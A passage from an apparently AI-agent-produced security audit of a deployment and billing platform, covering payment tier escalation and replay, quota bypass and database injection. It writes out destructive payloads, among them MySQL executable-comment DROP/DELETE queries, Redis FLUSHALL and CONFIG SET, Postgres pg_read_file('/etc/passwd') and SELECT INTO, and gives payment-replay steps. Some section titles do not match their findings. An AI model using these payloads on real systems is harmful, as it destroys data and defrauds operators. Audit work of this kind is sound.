        cookieStore.delete(COOKIE_NAME);
    }

src/cli/index.js:104-109
                    const config = { instanceUrl, token, lastLogin: ... };
                    fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
```
- **Agent says it ruled out:** Grepped case-insensitively for `revoke|jti|tokenVersion|sessionVersion|invalidateSession|logoutAll` across src — the only hits are team-invite revocation and GCP IAM role revocation, nothing session-related. Read both logout handlers (src/app/api/auth/logout/route.ts) end to end: both paths call only `clearSessionCookie()`. Confirmed `verifySessionToken` performs no database lookup of any kind.

> **Coverage notes (D2):** Swept end-to-end: src/lib/auth.ts (all 182 lines), src/lib/config.ts, src/app/api/auth/{github,callback,logout}/route.ts, src/proxy.ts, src/app/dashboard/layout.tsx, src/components/DashboardSidebar.tsx, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, src/app/api/billing/{checkout,verify}/route.ts, src/lib/billing/{payments,caps,tiers}.ts, src/app/billing/page.tsx, src/cli/index.js login flow, Dockerfile, env.example, next.config.ts. Repo-wide greps for MOCK_DB (~60 hits), NODE_ENV, verifySessionToken/createSessionToken/deployify_session, revoke|jti|tokenVersion, session prop drilling, and port validation helpers.

Hypotheses I tested and REJECTED (do not re-report):
- "Undefined JWT_SECRET yields an auth bypass." Verified empirically with node + jose: `new TextEncoder().encode(undefined)` produces a zero-length key and jose throws `DOMException: Zero-length key is not supported` on both sign and verify. verifySessionToken catches and returns null, and getSession's no-token path returns null in production. It fails closed (total outage, not a bypass), so it is not a security finding. validateConfig() only console.warns on missing vars, which is the underlying smell.
- "OAuth state is generated but never verified." It IS verified — src/app/api/auth/callback/route.ts:33-41 compares the `oauth_state` cookie to the `state` param, using 32 bytes of crypto.getRandomValues. The double-submit pattern is sound; it just does not (and cannot) defend against finding #1, where the attacker supplies the initiating URL.
- "The `oauth_state` cookie's `secure: process.env.NODE_ENV === 'production'` is wrong on Cloud Run." The comments at src/lib/auth.ts:114 and callback:93 imply NODE_ENV may not be production there, but the Dockerfile hard-sets `ENV NODE_ENV=production` in the runner stage, so the shipped image is fine. Inconsistent style, not exploitable.
- "The dev-only `'deleted'` cookie sentinel reaches production." Both branches (src/lib/auth.ts:93 and :131) are gated purely on `NODE_ENV === 'development'`, with no MOCK_DB disjunct, so a production container cannot reach them.
- "GET /api/auth/logout is CSRF-able." True, but the impact is a forced logout only. Below the medium bar.
- "proxy.ts only checks cookie presence, not validity, for /dashboard." Real, but not independently exploitable: src/app/dashboard/layout.tsx:22-31 re-checks with getSession() and every API route calls getSession() itself, so a garbage cookie yields a redirect, not access. Reported only as context inside finding #6.

NOT covered (out of my dimension or needs runtime): the ~86 API routes' per-route authorization (checkProjectAccess coverage), src/middleware/rbac.ts internals, src/lib/crypto.ts key derivation (note: config.security.encryptionKey falls back to JWT_SECRET at src/lib/config.ts:60 — key reuse across two cryptosystems, worth a crypto-dimension look), the /api/v1/collect ingest endpoint, and GitHub webhook signature verification. One adjacent routing issue I confirmed but did not report because it belongs to another dimension: project slug uniqueness is enforced per-user (src/app/api/projects/route.ts:123 getProjectBySlug(session.user.id, slug)) while public resolution is global with `.limit(1)` and no ordering (src/lib/db.ts:671-690), so two users can hold the same slug and traffic resolution between them is non-deterministic.


## D3. Injection into user-owned databases  <sub>`injection-db`</sub>

### 🔴 CRITICAL — Payment verification grants a client-chosen subscription tier; the Razorpay signature only covers orderId|paymentId, not the tier or amount
- **Location:** `src/app/api/billing/verify/route.ts:19`
- **Category:** `broken-payment-integrity`
- **Failure scenario:** A logged-in user POSTs /api/billing/checkout {tierId:'pro'} and is charged the Pro price of INR 1,500 (src/lib/billing/tiers.ts:45). Razorpay returns razorpay_order_id / razorpay_payment_id / razorpay_signature to the browser. Instead of letting the page handler run (src/app/billing/page.tsx:135-146), the user replays those three values to /api/billing/verify by hand with {"tierId":"enterprise"}. verifyPaymentSignature HMACs only `orderId + '|' + paymentId`, so the signature still validates, and the route writes tier:'enterprise' verbatim. Nothing in the route reads the order back from Razorpay, compares the captured amount to TIERS['enterprise'].price (INR 15,000), or checks the tierId recorded in the server-created order's notes.
- **Impact:** Any paying customer obtains the Enterprise tier for the price of the cheapest paid tier — 10x revenue loss per account, plus TIERS.enterprise grants Infinity projects / deployments / buildMinutes / bandwidth (src/lib/billing/tiers.ts:70-75), which is the only server-side quota gate on platform-funded Cloud Build and Cloud Run spend.
- **Evidence:**

```ts
const { orderId, paymentId, signature, tierId } = body;
...
const isValid = verifyPaymentSignature(orderId, paymentId, signature);
if (!isValid) { ... 400 ... }
// Update user subscription
const updatedSubscription = {
    tier: tierId as 'free' | 'pro' | 'team' | 'enterprise',
    status: 'active' as const,
    ...
};
await updateUser(session.user.id, { subscription: updatedSubscription });

// src/lib/billing/payments.ts:60-63
const hmac = crypto.createHmac('sha256', secret);
hmac.update(orderId + '|' + paymentId);
const generatedSignature = hmac.digest('hex');
return generatedSignature === signature;
```
- **Agent says it ruled out:** Read the entire 72-line verify route: it calls getSession() (auth present) but performs no gateway-side order lookup. Grepped for razorpay order fetch helpers — src/lib/billing/payments.ts exports only getRazorpay/createOrder/verifyPaymentSignature/verifyWebhookSignature; there is no orders.fetch call anywhere in src/. Grepped `TIERS[` and `tier.price` — the price is only consulted in checkout, never in verify. Confirmed src/app/billing/page.tsx:144 passes tierId 'from closure', i.e. purely client state.

### 🟠 HIGH — Payment verification has no idempotency ledger and never binds the payment to the session user, so one purchase can upgrade unlimited accounts unlimited times
- **Location:** `src/app/api/billing/verify/route.ts:29`
- **Category:** `payment-replay`
- **Failure scenario:** User A pays once and captures the triple (razorpay_order_id, razorpay_payment_id, razorpay_signature) from their own browser devtools. The route never checks (a) that the order's notes.userId equals session.user.id — the order notes {userId, tierId} set at src/app/api/billing/checkout/route.ts:81 are never read back, and (b) that this paymentId has not already been redeemed — no payments/redemptions collection is written or queried. User A posts the same triple from account B, C, D…: every one of them is upgraded. A can also re-post it from their own account every month to mint a fresh 30-day currentPeriodEnd. Grepped Collections for a payments ledger: src/lib/firebase.ts Collections has no payments/redemptions entry, and the INVOICES collection is never written (see the dead-invoice finding).
- **Impact:** A single INR 1,500 charge can be resold to an unbounded number of accounts, and any leaked/logged payment triple (support ticket, browser history, client-side error report) is a permanent free-upgrade token. Combined with the tier-escalation defect above, one INR 1,500 payment provisions unlimited Enterprise accounts.
- **Evidence:**

```ts
const isValid = verifyPaymentSignature(orderId, paymentId, signature);

if (!isValid) {
    return NextResponse.json({ error: 'Invalid payment signature' }, { status: 400, headers: securityHeaders });
}

// Update user subscription
const updatedSubscription = { tier: tierId as ..., status: 'active' as const, currentPeriodStart: new Date(), currentPeriodEnd: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), razorpaySubscriptionId: orderId };

await updateUser(session.user.id, { subscription: updatedSubscription });
```
- **Agent says it ruled out:** Read the full verify route — no dedupe, no order-ownership check. Grepped `createInvoiceRecord|Collections.INVOICES|razorpaySubscriptionId` across src/: razorpaySubscriptionId is only written, never queried; no uniqueness index. Checked src/proxy.ts:46-49 strictRateLimitRoutes — only '/api/auth/' and '/api/webhooks/' get the 30/min cap, so /api/billing/verify runs at 100/min per IP+path from an in-memory per-instance Map (src/proxy.ts:21), which does not stop replay.

### 🟠 HIGH — Paid subscriptions never expire and cancellation is ignored: writers set currentPeriodEnd but the only expiry check reads subscription.expiresAt, which nothing ever writes
- **Location:** `src/lib/billing/tiers.ts:115`
- **Category:** `subscription-lifecycle`
- **Failure scenario:** Both writers of the subscription object — src/app/api/billing/verify/route.ts:43 and src/app/api/billing/webhook/route.ts:47 — set `currentPeriodEnd: new Date(Date.now() + 30*24*60*60*1000)` and never set `expiresAt`. `grep -rn "expiresAt" src/` shows the field is only ever *read* (src/lib/db.ts:40, 867, 924, 964 and tiers.ts:115) — no code path assigns subscription.expiresAt. So the guard at tiers.ts:115 is dead: after a single one-time INR 1,500 Razorpay order (checkout creates a one-off order via createOrder, not a Razorpay recurring subscription), the user holds Pro forever. caps.getUserTier — the tier used by the only server-side quota gate at src/app/api/projects/[id]/deploy/route.ts:54 — ignores expiry and `status` entirely, so even subscription.status === 'canceled' or 'unpaid' still returns the paid tier.
- **Impact:** Every paid plan is effectively a one-time lifetime purchase: month 2 onward is 100% revenue loss, and there is no way to downgrade a delinquent or cancelled account — the quota gate keeps honoring the paid limits against platform-funded Cloud Build/Cloud Run spend.
- **Evidence:**

```ts
// tiers.ts:110-120
export function calculateTierLimits(user: User | null): TierLimits {
    const tierId = (user as User & { subscription?: { tier?: TierType; expiresAt?: Date } })?.subscription?.tier || 'free';
    const subscription = (user as User & { subscription?: { tier?: TierType; expiresAt?: Date } })?.subscription;
    if (subscription?.expiresAt && subscription.expiresAt < new Date()) {
        return TIER_LIMITS['free'];
    }
    return TIER_LIMITS[tierId];
}

// src/lib/billing/caps.ts:37-41 — the path the deploy gate actually uses
export async function getUserTier(userId: string): Promise<Tier> {
    const user = await getUserById(userId);
    if (!user) return DEFAULT_TIER;
    return getTier(user.subscription?.tier);
}
```
- **Agent says it ruled out:** Grepped `currentPeriodEnd|expiresAt` across all of src/ — the two billing writers are the only producers of currentPeriodEnd and there is no consumer of it. Grepped for a renewal/downgrade cron: src/app/api/cron/ contains only `optimize`, which touches storageConfigs and never reads user.subscription. Confirmed the User type declares both fields (src/types/index.ts:46,48), so this is a field-name mismatch, not a missing type.

### 🟠 HIGH — GitHub-webhook deployments bypass the usage-cap gate entirely; caps are only enforced on the manual /deploy route
- **Location:** `src/app/api/webhooks/github/route.ts:129`
- **Category:** `quota-bypass`
- **Failure scenario:** A free-tier account (TIERS.free = 20 deployments/mo, 100 build minutes/mo, src/lib/billing/tiers.ts:34-39) connects a repo and simply pushes commits instead of clicking Deploy. Each push reaches handlePushEvent, which goes createDeployment -> generateCloudRunDeployConfig -> submitCloudBuild with no call to checkUsageLimits. The same hole exists in handlePullRequestEvent (line 520 createDeployment, line 590 submitCloudBuild). Because a `pull_request` `opened`/`synchronize` build is triggered by *anyone on the internet* who opens a PR against a connected public repo, an unauthenticated third party can submit unbounded Cloud Build jobs against the project — each one pulling the project's preview env vars and runtimeSecrets via getEnvVarsForDeployment(project,'preview',...) at line 547 and the decrypted owner GitHub token at line 559.
- **Impact:** Tier quotas are unenforceable through the primary deployment path — a free account can consume unlimited platform-funded Cloud Build minutes, Artifact Registry storage and Cloud Run revisions. With the PR path this is remotely reachable by an unauthenticated attacker, making it a direct cost-amplification/DoS vector against the platform's GCP bill.
- **Evidence:**

```ts
// handlePushEvent — no cap check anywhere between signature verification and build submission
const deployment = await createDeployment({
    projectId: project.id,
    type: deploymentType,
    status: 'queued',
    gitBranch: branch,
    gitCommitSha: head_commit.id,
    ...
});
...
const { buildId, logUrl } = await submitCloudBuild(buildConfig, project.region);

// contrast: src/app/api/projects/[id]/deploy/route.ts:53-59
const { withinLimits, limitType } = await checkUsageLimits(session.user.id);
if (!withinLimits) {
    return NextResponse.json({ error: `Usage limit exceeded: ${limitType}. Please upgrade your plan.` }, { status: 403, headers: securityHeaders });
}
```
- **Agent says it ruled out:** `grep -rn "checkUsageLimits|calculateTierLimits|getUserTierLimits|getUserTier\b" src/` returns exactly two consumers outside src/lib/billing: src/app/api/projects/[id]/deploy/route.ts:54 and src/app/api/billing/usage/route.ts:29 (read-only display). Read createDeployment (src/lib/db.ts:1147-1163) and submitCloudBuild — neither consults limits. The proxy rate limit (src/proxy.ts:46-49, 30/min for '/api/webhooks/') keys on `${ip}:${pathname}` from GitHub's rotating delivery IPs in a per-instance in-memory Map, so it neither identifies the user nor enforces a billing quota.

### 🟠 HIGH — Repo-to-project binding is by non-unique repoFullName resolved with limit(1), and project creation only requires read access to the repo
- **Location:** `src/lib/db.ts:1039`
- **Category:** `broken-access-control`
- **Failure scenario:** Attacker POSTs /api/projects {repoFullName:'victim-org/public-app'}. getRepo is octokit repos.get (src/lib/github.ts:88), which succeeds for any public repo with any GitHub token — there is no ownership/admin assertion. createRepoWebhook then fails with 404/403 and the failure is swallowed, so the project is created anyway. Nothing enforces uniqueness on repoFullName (no such index or pre-check exists in createProject, src/lib/db.ts:978-999). Now two project documents share repoFullName='victim-org/public-app'. Both webhook handlers resolve the project with getProjectByRepoFullName(repository.full_name) (route.ts:92 and :232), and a Firestore equality query with no orderBy returns results ordered by __name__ ascending — document ids are `proj_` + Math.random base36 (src/lib/utils.ts:20-24), so the attacker deletes and recreates until their id sorts below the victim's. From then on every genuine, correctly-signed push from the victim's repo is routed into the attacker's project: it builds with the attacker's env vars, deploys to the attacker's Cloud Run service, and the buildId/logUrl land in the attacker's deployment record — while the victim's own pipeline silently stops firing.
- **Impact:** Silent takeover of another tenant's CD pipeline for any public repo: victim's deployments stop with no error (handlePushEvent just returns), the attacker receives their commits' build output and controls the served revision, and PR-closed events let the attacker's storageConfigs drive deleteService/deleteSqlDatabase/dropDatabase against attacker-chosen resources on victim-triggered events.
- **Evidence:**

```ts
export async function getProjectByRepoFullName(repoFullName: string): Promise<Project | null> {
    const db = getDb();
    const snapshot = await db
        .collection(Collections.PROJECTS)
        .where('repoFullName', '==', repoFullName)
        .limit(1)
        .get();

// src/app/api/projects/route.ts (POST) — only proof required is that the repo is readable
const repoData = await getRepo(session.accessToken, owner, repo);
...
try {
    await createRepoWebhook(session.accessToken, owner, repo);
} catch (error) {
    console.error('Failed to create webhook:', error);
    // Continue without webhook - user may not have admin access
}
```
- **Agent says it ruled out:** Grepped every use of repoFullName in src/lib/db.ts — the only query is the limit(1) equality lookup; no uniqueness constraint, no userId or teamId predicate in the webhook lookup. Read the full project POST handler: the only authorization is getSession() plus optional team membership; there is no check of repoData.permissions.admin or repoData.owner. Confirmed the webhook handlers do not re-check ownership after resolving the project (route.ts:92-101 and :232-244 go straight to getUserById(project.userId)).

### 🟡 MEDIUM — Razorpay webhook is verified with the API key secret; no dedicated webhook secret exists, so payment.captured is either unverifiable-by-design or silently dropped
- **Location:** `src/app/api/billing/webhook/route.ts:16`
- **Category:** `webhook-authenticity`
- **Failure scenario:** Razorpay signs X-Razorpay-Signature with the per-webhook secret configured in the dashboard, which is a distinct value from RAZORPAY_KEY_SECRET. There is no RAZORPAY_WEBHOOK_SECRET in src/lib/config.ts and none in env.example (grepped: env.example lines 57-59 define only RAZORPAY_KEY_ID and RAZORPAY_KEY_SECRET). Two outcomes, both bad: (a) the operator leaves the dashboard webhook secret at its own value, so every payment.captured delivery fails the HMAC and returns 400 — a customer whose browser closes, crashes, or loses network between the Razorpay modal succeeding and the /api/billing/verify POST is charged and never provisioned, with zero reconciliation path since the webhook is the only out-of-band provisioning route; or (b) the operator sets the dashboard webhook secret equal to RAZORPAY_KEY_SECRET to make it work, which turns the live API credential into an HMAC key transmitted-over and validated-against every inbound webhook, and any HMAC oracle or config leak now costs the full payment API key rather than a rotatable webhook secret.
- **Impact:** In case (a) paid-but-unprovisioned customers are systematically produced with no automated remediation (a support-and-chargeback generator); in case (b) the highest-value payment credential is reused as a webhook HMAC key, collapsing the blast radius separation the gateway provides.
- **Evidence:**

```ts
const isValid = verifyWebhookSignature(
    body,
    signature,
    config.billing.razorpay.keySecret
);

// src/lib/config.ts:64-69 — the only two Razorpay values that exist
billing: {
    razorpay: {
        keyId: process.env.RAZORPAY_KEY_ID,
        keySecret: process.env.RAZORPAY_KEY_SECRET,
    },
},

// src/lib/billing/payments.ts:13-16 — the same value is the API client credential
razorpayInstance = new Razorpay({ key_id: ..., key_secret: config.billing.razorpay.keySecret });
```
- **Agent says it ruled out:** Grepped `RAZORPAY` across src/ and env.example — only KEY_ID and KEY_SECRET exist; no webhook-secret variable is defined or read anywhere. Read src/lib/billing/payments.ts:69-83 in full: verifyWebhookSignature fails closed on an undefined secret (returns false), so this is not a signature-bypass — the defect is the conflated secret and the resulting silent-drop failure mode. Confirmed the webhook is the only provisioning path other than the browser-driven /api/billing/verify call at src/app/billing/page.tsx:137.

### 🟡 MEDIUM — Checkout charges the tier price with no tax and the entire invoice pipeline is dead code, so no GST is collected and no invoice record is ever created
- **Location:** `src/app/api/billing/checkout/route.ts:66`
- **Category:** `billing-integrity`
- **Failure scenario:** An Indian customer upgrades to Pro. checkout creates a Razorpay order for exactly 150000 paise (INR 1,500) — calculateTax is never invoked, so the 18% GST the code models is never added to the charge. After Razorpay captures, neither /api/billing/verify nor /api/billing/webhook calls generateInvoiceData or createInvoiceRecord: `grep -rn "createInvoiceRecord|generateInvoiceData" src/` matches only src/lib/billing/invoices.ts itself and invoices.test.ts. The Collections.INVOICES collection therefore stays empty forever, so listInvoicesForUser (src/lib/billing/invoices.ts:261) always returns [] and GET /api/billing/invoices always renders an empty billing history, while the /api/billing/invoices/[id]/download PDF generator is unreachable.
- **Impact:** 18% GST is under-collected on every Indian transaction — an unrecoverable liability the platform must absorb out of already-received revenue — and no tax invoice or payment record is ever persisted, so there is no financial audit trail tying any Razorpay capture to a user and nothing to reconcile chargebacks or the paid-but-unprovisioned cases against.
- **Evidence:**

```ts
// Razorpay expects amount in paise (multiply by 100)
// Assuming price is in INR for Razorpay
const amount = tier.price * 100;
...
const order = await createOrder(amount, 'INR', `receipt_${user.id}_${Date.now()}`, { userId: user.id, tierId: tier.id });

// src/lib/billing/tax.ts:13-18 — never reached from any route
if (code === 'IN') { const taxRate = 0.18; return { taxAmount: amount * taxRate, taxRate }; }

// src/lib/billing/invoices.ts:213-221 — never called from any route
export async function createInvoiceRecord(invoice: Invoice): Promise<string> {
    const db = getDb();
    const invoiceRef = await db.collection(Collections.INVOICES).add({ ...invoice, createdAt: new Date() });
```
- **Agent says it ruled out:** Grepped calculateTax callers: only generateInvoiceData (src/lib/billing/invoices.ts:233), which itself has no callers outside its test. Read both provisioning writers (verify route lines 38-63, webhook route lines 30-56) end-to-end — neither creates an invoice or applies tax. Confirmed Collections.INVOICES is only read (listInvoicesForUser, getInvoiceById) and written by the uncalled createInvoiceRecord. Verified the invoice download route itself is correctly authorized (ownership check at src/app/api/billing/invoices/[id]/download/route.ts:31), so this is a missing-writer defect, not an access-control one.

> **Coverage notes (D3):** Swept and read end-to-end: src/app/api/webhooks/github/route.ts (624 lines), src/app/api/billing/{webhook,verify,checkout,usage}/route.ts, src/app/api/billing/invoices/route.ts + [id]/download/route.ts, src/lib/billing/{payments,pricing,pricing-utils,tiers,caps,tracker,tax,invoices}.ts, src/lib/security/index.ts, src/lib/webhooks.ts, src/app/api/cron/optimize/route.ts, src/lib/config.ts, env.example, src/proxy.ts (routing/rate-limit/auth), src/app/billing/page.tsx (client checkout flow), plus the corroborating paths src/app/api/projects/route.ts (POST), src/app/api/projects/[id]/route.ts (PATCH allowlist), src/app/api/projects/[id]/deploy/route.ts, src/lib/db.ts (getProjectByRepoFullName, createProject, createDeployment, updateUser), src/lib/github.ts (getRepo, createRepoWebhook), src/lib/gcp/cloudbuild.ts (build-config generation), src/lib/utils.ts (generateId, shouldAutoDeploy), src/types/index.ts (User.subscription).

Candidates I examined and deliberately REJECTED as non-findings:
- verifyGitHubWebhookSignature with an unset GITHUB_WEBHOOK_SECRET: crypto.createHmac('sha256', undefined) throws at src/lib/security/index.ts:62-65, which is OUTSIDE the try block at :67, so it propagates to the route's catch and returns 500. Fails closed, no bypass.
- timingSafeEqual on unequal-length buffers (security/index.ts:69-72): throws, caught, returns false. Correct fail-closed behavior.
- verifyWebhookSignature / verifyPaymentSignature using `===` instead of timingSafeEqual: non-constant-time, but a remote timing attack on a 64-char hex HMAC over HTTP is not practically exploitable. Stylistic.
- /api/cron/optimize auth (route.ts:37-42): the `NODE_ENV === 'production' || MOCK_DB !== 'true'` disjunction means a production deployment always 401s on a missing or wrong CRON_SECRET. The bypass only opens with NODE_ENV!=='production' AND MOCK_DB==='true', i.e. local dev. Not exploitable in production.
- Razorpay webhook trusting payment.notes.userId/tierId: the order notes are set server-side at checkout/route.ts:81. Whether Razorpay Checkout's client-side `notes` option can override the order's notes on the payment entity is gateway-specific and I could not confirm it from this repo, so I did not report it. Worth a targeted check against Razorpay docs — if client notes do win, it is a second independent tier-escalation path with no amount validation in the webhook.
- SSRF via project.webhookUrl -> sendWebhookNotification (src/lib/webhooks.ts:12): webhookUrl is in the PATCH allowlist (src/app/api/projects/[id]/route.ts:136) with no scheme/host validation, giving a blind outbound POST from the platform's GCP workload. Response body is never returned to the user and the GCP metadata server requires a Metadata-Flavor header, so I judged it below the bar here — flagging it for whoever owns the SSRF dimension.
- Decrypted GitHub token interpolated in plaintext into a Cloud Build step arg (src/lib/gcp/cloudbuild.ts:505: `git clone https://x-access-token:${gitToken}@github.com/${repoFullName}`) instead of using Cloud Build availableSecrets. Real secret-hygiene defect, but exposure is confined to principals with cloudbuild.builds.get on the platform's own GCP project — off this dimension, flagging for the secrets/deployment reviewer.
- Command injection via commitSha/branch into that same bash -c string: both values originate from GitHub-signed webhook payloads or getBranchLatestCommit, so they are not attacker-controlled. `branch` only reaches Cloud Build `tags`, where a malformed value causes API rejection, not injection.

NOT covered (outside this dimension): src/app/api/v1/collect, src/app/api/v1/proxy/[slug], the storage/database connectors, auth/session issuance internals, and RBAC on non-billing routes.


## D4. Secrets management & cryptography  <sub>`secrets-crypto`</sub>

### 🔴 CRITICAL — Firestore Data Lab queries hit Deployify's own platform Firestore (getDb()), not the customer connector — cross-tenant read of users/projects/audit collections
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:854`
- **Category:** `broken-access-control`
- **Failure scenario:** getDb() (src/lib/firebase.ts:53) returns getFirestore(app) — the platform's own '(default)' Firestore that stores every tenant's data — and the firestore branch never references storageConfig / the connector's provisioned database at all. Any registered user: (1) creates their own project (they are 'owner'), (2) POSTs to /storage with {"type":"firestore","name":"x","connectionString":"firestore://dummy"} (any non-empty connection string satisfies the line-190 guard; the firestore branch ignores it), (3) POSTs to this query route with body {"collection":"users"} or {"collection":"projects","where":[["userId","==","<victim>"]]}. The response returns Deployify's internal `users`, `projects` (including storageConfigs / connectionStringSecretId references), `dataLabAudit`, `saved_queries`, `auditLogs`, etc. for ALL tenants. On the owner/session path no masking is applied (shouldMask is false), so records are returned in full.
- **Impact:** Full cross-tenant / internal database read of the entire Deployify control-plane Firestore by any authenticated user, exposing all users, all projects and their secret references, and audit logs. Complete tenant isolation break.
- **Evidence:**

```ts
} else if (storageConfig.type === 'firestore') {
    const db = getDb();
 ... 
    queryObj = db.collection(collection);
    if (where && Array.isArray(where)) { where.forEach((w) => { ... queryObj = queryObj.where(w[0], w[1], w[2]); }); }
    const snapshot = await queryObj.limit(Math.min(limit, MAX_ROWS)).get();
    const results = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
```
- **Agent says it ruled out:** Read src/lib/firebase.ts getDb() (returns the default app Firestore, no per-tenant DB), confirmed the firestore branch (lines 853-925) never uses storageConfig.connectionString/resourceName to target a customer DB; confirmed storage POST route (src/app/api/projects/[id]/storage/route.ts:136) allows creating type 'firestore' connectors; confirmed line 190 only requires a non-empty connection string which the firestore branch never consumes; confirmed no collection allow-list or tenant scoping is applied to the user-supplied `collection`.

### 🟠 HIGH — Data Lab SQL read-only enforcement bypassed via MySQL executable comments and comment-stripping empty-statement trick → arbitrary DDL/DML
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:138`
- **Category:** `sql-injection`
- **Failure scenario:** The validator strips /* ... */ comments to build `cleanQuery`, but the ORIGINAL `query` is what is sent to MySQL (connection.query(query), multipleStatements:true at line 650). MySQL executes the contents of `/*! ... */` version-comments. Payload: `/*!40000 DROP TABLE users */` — the comment strip makes cleanQuery empty, so `statements` is [] and the for-loop performs ZERO checks (no forbidden-keyword test, no allowed-prefix test), the request passes, and MySQL executes `DROP TABLE users`. Variant with a leading benign statement: `SELECT 1;/*!40000 DELETE FROM accounts */` → validator sees only `SELECT 1`, MySQL runs the DELETE. This defeats the 'Only read-only queries are allowed' guarantee; because the route never blocks role 'viewer' (only masks output at line 943), even a read-only viewer can drop/modify tables.
- **Impact:** Complete bypass of the advertised read-only guard on the customer's MySQL/PlanetScale connector: arbitrary DROP/DELETE/UPDATE/INSERT, including by users holding the 'viewer' role who are denied write access on every other storage endpoint.
- **Evidence:**

```ts
const cleanQuery = query.replace(/\/\*[\s\S]*?\*\/|--.*$/gm, '').replace(/#.*$/gm, '').trim();
 ... 
const statements = cleanQuery.split(/;(?=(?:[^']*'[^']*')*[^']*$)/).map(...).filter(s => s.length > 0);
for (const statement of statements) { ... }   // validator runs on cleanQuery, DB executes original `query`
```
- **Agent says it ruled out:** Confirmed the read-only block (lines 135-173) is the only gate and operates on the comment-stripped `cleanQuery` while execution uses the untouched `query`; confirmed multipleStatements:true is unconditionally set for the MySQL path (line 650) and IAM path (line 365); confirmed no `access.role === 'viewer'` rejection exists in this route (grep shows role only used for masking at line 943).

### 🟠 HIGH — Redis Data Lab has no read-only enforcement — arbitrary Redis command execution (FLUSHALL/DEL/SET/CONFIG) for any role including viewer
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:824`
- **Category:** `command-injection`
- **Failure scenario:** The 'Strict Read-Only Enforcement' block (line 136) applies only when storageConfig.type includes 'sql'/'planetscale'; the memorystore-redis branch performs no command allow-listing. A user (including one with the read-only 'viewer' role, which is not blocked by this route) POSTs body {"query":"FLUSHALL"} — the route calls redis.flushall() and erases the entire cache. Equivalent destructive/config payloads: {"query":"CONFIG SET dir /tmp"}, {"query":"DEL <key>"}, or the JSON form {"query":"{\"command\":\"flushall\",\"args\":[]}"}. Output PII-masking (line 943) does not prevent the write — the command has already mutated/destroyed data before the response is read.
- **Impact:** Any project collaborator, including a designated read-only 'viewer', can destroy or overwrite the customer's Memorystore/Redis data and change server configuration through the query proxy that is documented as read-only.
- **Evidence:**

```ts
const [cmd, ...args] = query.split(' ');
// @ts-expect-error - Dynamic redis command
if (typeof redis[cmd.toLowerCase()] === 'function') {
    // @ts-expect-error - Dynamic redis command
    results = await redis[cmd.toLowerCase()](...args);
}
```
- **Agent says it ruled out:** Confirmed the read-only guard (lines 135-173) is gated on `storageConfig.type.includes('sql') || type === 'planetscale'` and never runs for redis; confirmed the redis branch (lines 796-852) has no forbidden-command list; confirmed the route never rejects role 'viewer' (grep: role used only for masking) whereas sibling routes (import, ingest, apply-index) explicitly block viewers.

### 🟡 MEDIUM — apply-index route executes attacker-supplied customSql verbatim and interpolates unsanitized table/column identifiers into DDL
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/apply-index/route.ts:53`
- **Category:** `sql-injection`
- **Failure scenario:** Any non-'viewer' team member (role 'member' or 'admin', not only the owner) POSTs {"customSql":"DROP TABLE users; DELETE FROM accounts"} and it is executed directly via client.query(sql) (Postgres simple-query protocol executes multiple statements in one string). No read-only validation is applied on this route at all. Even without customSql, `column`/`table` are concatenated into the DDL with no identifier escaping/validation, e.g. column = `id") ON "users";--`, giving identifier injection on the CREATE INDEX. For IAM Cloud SQL connectors the executed statement runs as the privileged deployify-sa service-account identity.
- **Impact:** Arbitrary SQL execution (DDL/DML, table drops, data modification) on the customer's Cloud SQL/PlanetScale database by any write-capable collaborator, with zero read-only gating — inconsistent with the Data Lab query route's read-only model and reachable by non-owner members.
- **Evidence:**

```ts
if (customSql) {
    sql = customSql;
} else {
    ... const name = indexName || `idx_${table}_${column}_...`;
    if (isPostgres) { sql = `CREATE INDEX CONCURRENTLY IF NOT EXISTS "${name}" ON "${table}" ("${column}")`; }
    else { sql = `CREATE INDEX \`${name}\` ON \`${table}\` (\`${column}\`)`; }
}
... await client.query(sql);  // pg simple-query allows stacked statements
```
- **Agent says it ruled out:** Confirmed the only authz gate is `access.role === 'viewer'` (line 32) which still permits 'member'/'admin'; confirmed customSql is assigned to `sql` and passed straight to client.query/connection.query with no keyword filtering; confirmed identifiers are wrapped only in quotes/backticks with no escaping or allow-list; confirmed Postgres path uses client.query (simple query, multi-statement capable).

### 🟡 MEDIUM — Data Lab read-only guard misses Postgres 'SELECT ... INTO' — allows table creation / writes through a SELECT-prefixed query
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:140`
- **Category:** `sql-injection`
- **Failure scenario:** The forbidden list only blocks the literal phrases 'INTO OUTFILE' and 'INTO DUMPFILE', not a bare INTO, and does not treat `SELECT ... INTO` as a write. Payload: `SELECT * INTO exfil_copy FROM users` — statement starts with the allowed prefix SELECT, contains no forbidden keyword (the token is INTO, not CREATE), passes the guard, and Postgres executes it as a CREATE-TABLE-AS, writing a new table. Similarly `SELECT pg_read_file('/etc/passwd')` / `SELECT lo_export(...)` pass as they are function calls behind a SELECT prefix. This defeats the read-only guarantee for the Postgres/Supabase connector, again exploitable by a 'viewer'.
- **Impact:** Read-only enforcement bypass on customer Postgres: attacker can materialize tables (data duplication/exfiltration staging) and invoke write/file/large-object functions, all through a query the guard classifies as read-only.
- **Evidence:**

```ts
const forbiddenKeywords = ['INSERT','UPDATE','DELETE','DROP','ALTER','CREATE','REPLACE','TRUNCATE', ... 'INTO OUTFILE','INTO DUMPFILE','LOCK','UNLOCK'];
const allowedPrefixes = ['SELECT','SHOW','DESCRIBE','EXPLAIN','DISCOVER_SCHEMA','WITH'];
```
- **Agent says it ruled out:** Read forbiddenKeywords (lines 140-144) and confirmed no bare 'INTO' and no handling of SELECT...INTO; confirmed allowedPrefixes accepts 'SELECT' (line 145) so the statement is admitted; confirmed the admitted query is passed unchanged to client.query at line 563.

### 🟡 MEDIUM — Public dashboard-widget query path performs raw string substitution of attacker-controlled `variables` into NoSQL queries → unauthenticated MongoDB operator injection
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:123`
- **Category:** `nosql-injection`
